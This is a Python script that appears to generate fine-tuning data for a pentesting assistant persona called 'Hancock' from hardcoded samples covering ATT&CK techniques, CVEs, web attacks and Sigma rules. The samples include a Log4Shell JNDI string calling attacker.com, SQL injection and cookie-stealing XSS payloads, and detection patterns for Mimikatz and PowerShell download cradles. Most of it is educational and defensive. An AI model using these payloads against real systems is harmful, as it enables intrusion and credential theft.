#!/usr/bin/env python3
"""
Hancock Dataset Collector — Automated collection and curation of pentesting
and cybersecurity training data from public sources.

This module provides utilities to collect, clean, and format training data from:
- MITRE ATT&CK framework (techniques, tactics, procedures)
- CVE/NVD vulnerability databases
- Public exploit databases (Exploit-DB, Metasploit)
- Security blogs and writeups
- CTF challenges and solutions
- SIEM detection rules (Sigma, Suricata)

Usage:
    python hancock_dataset_collector.py --collect all --output ./data/collected
    python hancock_dataset_collector.py --collect mitre --output ./data/mitre
    python hancock_dataset_collector.py --format --input ./data/collected --output ./data/formatted
"""
from __future__ import annotations

import argparse
import json
import logging
import re
from pathlib import Path
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


class MITREATTACKCollector:
    """Collect and format MITRE ATT&CK framework data."""

    def __init__(self):
        self.techniques = []

    def collect(self) -> List[Dict[str, Any]]:
        """Collect MITRE ATT&CK techniques and generate training examples.

        This is a template implementation. In production, this would fetch
        from the official MITRE ATT&CK STIX/TAXII API or parse the JSON bundle.
        """
        logger.info("Collecting MITRE ATT&CK framework data...")

        # Example technique templates (in production, fetch from API)
        sample_techniques = [
            {
                "id": "T1003",
                "name": "OS Credential Dumping",
                "tactics": ["credential-access"],
                "description": "Adversaries may attempt to dump credentials to obtain account login information.",
                "detection": "Monitor for unusual process access to LSASS, NTDS.dit access, SAM registry access.",
                "mitigations": ["Credential Access Protection", "Privileged Account Management"],
            },
            {
                "id": "T1059",
                "name": "Command and Scripting Interpreter",
                "tactics": ["execution"],
                "description": "Adversaries may abuse command interpreters to execute commands or scripts.",
                "detection": "Monitor for execution of suspicious scripts, PowerShell logging, command-line arguments.",
                "mitigations": ["Execution Prevention", "Restrict Script Execution"],
            },
            {
                "id": "T1547",
                "name": "Boot or Logon Autostart Execution",
                "tactics": ["persistence", "privilege-escalation"],
                "description": "Adversaries may configure system settings to automatically execute a program during system boot.",
                "detection": "Monitor registry keys, startup folders, scheduled tasks for unauthorized changes.",
                "mitigations": ["Boot Integrity", "User Account Control"],
            },
        ]

        examples = []
        for tech in sample_techniques:
            # Generate Q&A pairs for each technique
            examples.append({
                "messages": [
                    {
                        "role": "system",
                        "content": "You are Hancock, an expert penetration tester and security researcher.",
                    },
                    {
                        "role": "user",
                        "content": f"Explain MITRE ATT&CK technique {tech['id']}: {tech['name']}",
                    },
                    {
                        "role": "assistant",
                        "content": f"**{tech['id']}: {tech['name']}**\n\n"
                        f"{tech['description']}\n\n"
                        f"**Tactics:** {', '.join(tech['tactics'])}\n\n"
                        f"**Detection:** {tech['detection']}\n\n"
                        f"**Mitigations:** {', '.join(tech['mitigations'])}",
                    },
                ],
                "metadata": {
                    "source": "mitre_attack",
                    "technique_id": tech["id"],
                    "tactics": tech["tactics"],
                },
            })

        logger.info(f"Generated {len(examples)} MITRE ATT&CK examples")
        return examples


class CVECollector:
    """Collect and format CVE vulnerability data."""

    def __init__(self):
        self.vulnerabilities = []

    def collect(self) -> List[Dict[str, Any]]:
        """Collect CVE data and generate training examples.

        In production, this would query the NVD API or CVE databases.
        """
        logger.info("Collecting CVE vulnerability data...")

        # Sample CVEs (in production, fetch from NVD API)
        sample_cves = [
            {
                "cve_id": "CVE-2021-44228",
                "name": "Log4Shell",
                "severity": "CRITICAL",
                "cvss": 10.0,
                "description": "Remote code execution in Apache Log4j via JNDI injection.",
                "affected": "Apache Log4j 2.0-beta9 to 2.14.1",
                "exploitation": "Send ${jndi:ldap://attacker.com/a} in logged fields",
                "remediation": "Upgrade to Log4j 2.17.0+ or set log4j2.formatMsgNoLookups=true",
            },
            {
                "cve_id": "CVE-2022-26134",
                "name": "Confluence OGNL Injection",
                "severity": "CRITICAL",
                "cvss": 9.8,
                "description": "Unauthenticated OGNL injection in Atlassian Confluence.",
                "affected": "Confluence Server and Data Center",
                "exploitation": "POST to /${...OGNL payload...}/",
                "remediation": "Update to patched versions per Atlassian advisory",
            },
        ]

        examples = []
        for cve in sample_cves:
            examples.append({
                "messages": [
                    {
                        "role": "system",
                        "content": "You are Hancock, a vulnerability researcher and penetration tester.",
                    },
                    {
                        "role": "user",
                        "content": f"Provide a detailed analysis of {cve['cve_id']} ({cve['name']})",
                    },
                    {
                        "role": "assistant",
                        "content": f"**{cve['cve_id']}: {cve['name']}**\n\n"
                        f"**Severity:** {cve['severity']} (CVSS {cve['cvss']})\n\n"
                        f"**Description:** {cve['description']}\n\n"
                        f"**Affected Systems:** {cve['affected']}\n\n"
                        f"**Exploitation:** {cve['exploitation']}\n\n"
                        f"**Remediation:** {cve['remediation']}",
                    },
                ],
                "metadata": {
                    "source": "cve_database",
                    "cve_id": cve["cve_id"],
                    "severity": cve["severity"],
                    "cvss": cve["cvss"],
                },
            })

        logger.info(f"Generated {len(examples)} CVE examples")
        return examples


class ExploitDBCollector:
    """Collect and format exploit data."""

    def collect(self) -> List[Dict[str, Any]]:
        """Collect exploit techniques and generate training examples."""
        logger.info("Collecting exploit techniques...")

        sample_exploits = [
            {
                "name": "SQL Injection",
                "category": "web",
                "description": "Inject SQL commands to manipulate database queries",
                "example": "' OR '1'='1' --",
                "detection": "Monitor for SQL error messages, unexpected query patterns, WAF alerts",
            },
            {
                "name": "Cross-Site Scripting (XSS)",
                "category": "web",
                "description": "Inject malicious scripts into web pages",
                "example": "<script>alert(document.cookie)</script>",
                "detection": "Content Security Policy violations, input validation failures",
            },
        ]

        examples = []
        for exploit in sample_exploits:
            examples.append({
                "messages": [
                    {
                        "role": "system",
                        "content": "You are Hancock, a web application security specialist.",
                    },
                    {
                        "role": "user",
                        "content": f"Explain {exploit['name']} attacks and how to test for them",
                    },
                    {
                        "role": "assistant",
                        "content": f"**{exploit['name']}**\n\n"
                        f"{exploit['description']}\n\n"
                        f"**Example Payload:** `{exploit['example']}`\n\n"
                        f"**Detection:** {exploit['detection']}\n\n"
                        f"Always test within authorized scope with proper permissions.",
                    },
                ],
                "metadata": {
                    "source": "exploit_database",
                    "exploit_type": exploit["name"],
                    "category": exploit["category"],
                },
            })

        logger.info(f"Generated {len(examples)} exploit examples")
        return examples


class SigmaRuleCollector:
    """Collect and format Sigma detection rules."""

    def collect(self) -> List[Dict[str, Any]]:
        """Collect Sigma rules for SOC training."""
        logger.info("Collecting Sigma detection rules...")

        sample_rules = [
            {
                "title": "Mimikatz Command Line",
                "description": "Detects Mimikatz execution via command line",
                "logsource": "windows",
                "detection_logic": "CommandLine contains 'sekurlsa::logonpasswords'",
                "technique": "T1003.001",
            },
            {
                "title": "Suspicious PowerShell Download",
                "description": "Detects PowerShell download cradles",
                "logsource": "powershell",
                "detection_logic": "ScriptBlockText contains 'DownloadString' or 'DownloadFile'",
                "technique": "T1059.001",
            },
        ]

        examples = []
        for rule in sample_rules:
            examples.append({
                "messages": [
                    {
                        "role": "system",
                        "content": "You are Hancock, a detection engineer and SOC analyst.",
                    },
                    {
                        "role": "user",
                        "content": f"Write a Sigma rule to detect: {rule['description']}",
                    },
                    {
                        "role": "assistant",
                        "content": f"```yaml\ntitle: {rule['title']}\n"
                        f"description: {rule['description']}\n"
                        f"logsource:\n  product: {rule['logsource']}\n"
                        f"detection:\n  selection:\n    {rule['detection_logic']}\n"
                        f"  condition: selection\n"
                        f"tags:\n  - attack.{rule['technique']}\n"
                        f"level: high\n```",
                    },
                ],
                "metadata": {
                    "source": "sigma_rules",
                    "rule_title": rule["title"],
                    "technique": rule["technique"],
                },
            })

        logger.info(f"Generated {len(examples)} Sigma rule examples")
        return examples


class DatasetCollector:
    """Main dataset collection orchestrator."""

    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        self.collectors = {
            "mitre": MITREATTACKCollector(),
            "cve": CVECollector(),
            "exploits": ExploitDBCollector(),
            "sigma": SigmaRuleCollector(),
        }

    def collect_all(self) -> List[Dict[str, Any]]:
        """Collect from all sources."""
        all_examples = []

        for name, collector in self.collectors.items():
            logger.info(f"Running collector: {name}")
            examples = collector.collect()
            all_examples.extend(examples)

        logger.info(f"Total examples collected: {len(all_examples)}")
        return all_examples

    def collect_source(self, source: str) -> List[Dict[str, Any]]:
        """Collect from a specific source."""
        if source not in self.collectors:
            raise ValueError(f"Unknown source: {source}. Available: {list(self.collectors.keys())}")

        logger.info(f"Collecting from: {source}")
        return self.collectors[source].collect()

    def save_dataset(self, examples: List[Dict[str, Any]], filename: str = "dataset.jsonl"):
        """Save collected examples to JSONL."""
        output_path = self.output_dir / filename
        with output_path.open("w") as f:
            for example in examples:
                f.write(json.dumps(example) + "\n")

        logger.info(f"Saved {len(examples)} examples to {output_path}")
        return output_path


def main():
    parser = argparse.ArgumentParser(
        description="Hancock Dataset Collector — Gather pentesting training data",
    )

    parser.add_argument(
        "--collect",
        type=str,
        choices=["all", "mitre", "cve", "exploits", "sigma"],
        default="all",
        help="Data source to collect from",
    )
    parser.add_argument(
        "--output",
        type=str,
        default="./data/collected",
        help="Output directory for collected data",
    )
    parser.add_argument(
        "--format",
        type=str,
        choices=["jsonl", "json"],
        default="jsonl",
        help="Output format",
    )

    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    collector = DatasetCollector(args.output)

    if args.collect == "all":
        examples = collector.collect_all()
    else:
        examples = collector.collect_source(args.collect)

    output_file = collector.save_dataset(examples, f"{args.collect}_dataset.jsonl")

    logger.info("✓ Dataset collection complete!")
    logger.info(f"  Output: {output_file}")
    logger.info(f"  Examples: {len(examples)}")


if __name__ == "__main__":
    main()
